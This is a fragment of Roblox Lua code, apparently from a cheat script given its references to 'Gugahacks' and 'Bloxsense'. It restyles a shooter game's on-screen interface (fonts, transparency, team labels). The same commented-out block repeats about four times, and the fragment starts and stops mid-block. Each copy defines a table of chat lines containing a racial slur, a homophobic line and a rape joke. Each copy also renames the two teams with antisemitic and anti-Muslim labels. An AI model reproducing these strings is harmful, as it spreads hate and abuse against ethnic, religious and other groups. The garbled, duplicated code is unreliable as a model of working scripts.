	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Transparency = 0.4

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.BackgroundColor3 = Color3.fromRGB(60, 60, 60)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Blue.Label.Text = "JEWS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TeamSelection.Red.Label.Text = "ALAHS"

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.CTWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Color.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.TWin.Info.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BuyZone.Size = UDim2.new(0, 0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Size = UDim2.new(0, 206, 0, 40)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Position = UDim2.new(0, 6, 0, 230)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.TextSize = 26.000

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Health.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Armor.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.APlus:Destroy()

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Plus:Destroy()	

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.Transparency = 0.9

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.PlayerPin.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.Controls.Text = words[math.random(1,#words)]

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoReserve.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.AmmoClip.TextColor3 = Color3.fromRGB(255, 255, 255)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.AmmoGUI.Slash.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Notify.Icon.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Back.Visible = false
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Matchpoint.Timer.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Text = "Map vote"
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.TextLabel.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.MapVote.Transparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.ImageTransparency = 0.6
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Defusing.Font = Enum.Font.Gotham
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Defusal.Time.Font = Enum.Font.Gotham

	game:GetService("Players").LocalPlayer.PlayerGui.Performance.Perf.Visible = false

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Transparency = 1
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.CTScore.Size = UDim2.new(0, 62, 0, 39)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.TScore.BackgroundTransparency = 0.800
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Size = UDim2.new(1, 0, 0, 36)
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Timer.Bomb.Animate:Destroy()
	game:GetService("Players").LocalPlayer.PlayerGui.GUI.UpperInfo.Scaler:Destroy()]]
 




--[[	local words = {"What the dog doin?","Bro this nigga gay","I raped your dog","Omnikonna is a nn","I love semi","Gugahacks on top!","Bloxsense on top letse go!"} 



	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Cash.BackgroundTransparency = 0.800

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.PHealth.Position = UDim2.new(0, 5, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Spectate.PlayerBox.GreyPart.Plus.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Circle.Transparency = 0.6

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Vitals.Transparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Buymenu.Base.ImageTransparency = 0.8

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item1.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item2.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item3.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item4.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item5.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item6.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Inventory.Item7.bk.ImageTransparency = 1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BackgroundColor3 = Color3.fromRGB(35, 35, 35)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderColor3 = Color3.fromRGB(0, 0, 0)

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.Transparency = 0.1

	game:GetService("Players").LocalPlayer.PlayerGui.GUI.Scoreboard.BorderSizePixel = 2

